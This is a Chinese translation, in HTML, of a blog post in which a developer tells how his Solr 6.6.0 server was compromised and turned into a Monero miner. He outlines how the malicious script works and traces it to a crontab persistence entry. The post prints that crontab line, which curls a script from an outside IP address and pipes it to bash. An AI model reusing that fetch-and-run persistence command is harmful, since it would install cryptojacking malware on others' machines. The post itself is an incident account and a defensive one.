<html>
<head>
<title>The time I was hacked by Mr. Sh</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">我被Sh先生黑的那次</h1>
<blockquote>原文：<a href="https://medium.com/swlh/the-time-i-has-hacked-by-mr-sh-583db12b7d8f#2019-05-30">https://medium.com/swlh/the-time-i-has-hacked-by-mr-sh-583db12b7d8f#2019-05-30</a></blockquote><div><div class="ds gw gx gy gz ha"/><div class="hb hc hd he hf"><div class=""/><p id="5dac" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">2017年，我零对一地开发了一个YouTube搜索网站，该网站使用字幕数据的索引，帮助用户浏览长视频频道。</p><figure class="je jf jg jh fd ji er es paragraph-image"><div role="button" tabindex="0" class="jj jk di jl bf jm"><div class="er es jd"><img src="../Images/295d9652244059a9737e17e3879f893a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5OWv9LmwiCeROcMoqo3paA.jpeg"/></div></div></figure><p id="c675" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">搜索使用Solr-6.6.0来存储和检索字幕数据的索引。我知道Solr使用了大量的RAM，但我没想到在我的网站上线几天后，它就开始消耗我服务器15%的CPU。</p><figure class="je jf jg jh fd ji er es paragraph-image"><div class="er es jp"><img src="../Images/fcd71ad66be5b1c84312f41ab550e899.png" data-original-src="https://miro.medium.com/v2/resize:fit:1102/format:webp/1*54KU9L0j4H2qUXS30u8owQ.jpeg"/></div></figure><p id="40be" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">虽然出乎意料，但15%的CPU消耗并没有引发任何危险信号。然而，如果我更加关注的话，使用量的突然增加应该会通知我一个问题。我停止关注了几个月，直到我开始收到关于100%使用率的电子邮件。</p><figure class="je jf jg jh fd ji er es paragraph-image"><div class="er es jq"><img src="../Images/de7032e64747ec6ca3097c4d99865cf7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1112/format:webp/1*c8Y_b68MggoYMBsGjNzFUQ.jpeg"/></div></figure><p id="07e4" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">我不知道的是，有人利用Solr-6.6.0 中的<a class="ae jr" href="https://www.mysonicwall.com/sonicalert/searchresults.aspx?ev=article&amp;id=1096" rel="noopener ugc nofollow" target="_blank">漏洞在我的服务器上运行一个挖掘Monero的sh脚本，出于某种原因，他们决定将他们的哈希能力从不明显的15% CPU增加到严重的100%。</a></p><p id="711f" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">以下是脚本工作原理的概述:</p><ol class=""><li id="3de1" class="js jt hi ih b ii ij im in iq ju iu jv iy jw jc jx jy jz ka bi translated">终止9所有消耗超过40% CPU的进程</li><li id="c7b0" class="js jt hi ih b ii kb im kc iq kd iu ke iy kf jc jx jy jz ka bi translated">Kill9任何预先存在的恶意软件(由之前运行此脚本导致)</li><li id="0558" class="js jt hi ih b ii kb im kc iq kd iu ke iy kf jc jx jy jz ka bi translated">将monero miner下载到/tmp并运行它</li><li id="ecf2" class="js jt hi ih b ii kb im kc iq kd iu ke iy kf jc jx jy jz ka bi translated">创建一个crontab来重新下载并每分钟重新运行这个sh脚本。</li></ol><p id="8f91" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">这个剧本叫做<a class="ae jr" href="https://gist.github.com/SlightlyCyborg/7c9c4bcd27de4311a7678e362227c8b8" rel="noopener ugc nofollow" target="_blank">Sh先生</a>，在htop中观看令人愤怒。每次我试图终止挖掘过程，它都会在一分钟后重新产生。我不得不离开的唯一线索是，在我的CPU变回空间加热器之前，一连串的procs直接开始运转。</p><p id="c6ce" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">我最后做了一个htop在整个周期中的延时截图，然后一帧一帧地分析它，直到我看到下载<code class="du kg kh ki kj b">mr.sh</code>的<code class="du kg kh ki kj b">curl</code>进程</p><p id="4cf8" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">我自己蜷缩在sh先生体内，最终发现它是如何不断逃避我的根除努力:<code class="du kg kh ki kj b">crontab</code>。之后我所要做的就是使用<code class="du kg kh ki kj b">crontab -e</code>编辑crontab文件并从其中删除<code class="du kg kh ki kj b">curl</code>调用。这是那个老太婆的样子。</p><pre class="je jf jg jh fd kk kj kl km aw kn bi"><span id="330f" class="ko kp hi kj b fi kq kr l ks kt">* * * * curl <a class="ae jr" href="http://192.99.142.248:8220/mr.sh" rel="noopener ugc nofollow" target="_blank">http://192.99.142.248:8220/mr.sh</a> | bash -sh &gt; /dev/null 2&gt;&amp;1</span></pre><p id="65c2" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">无论如何，这是我在linux服务器上发现的第一个恶意软件的故事。</p></div></div>    
</body>
</html>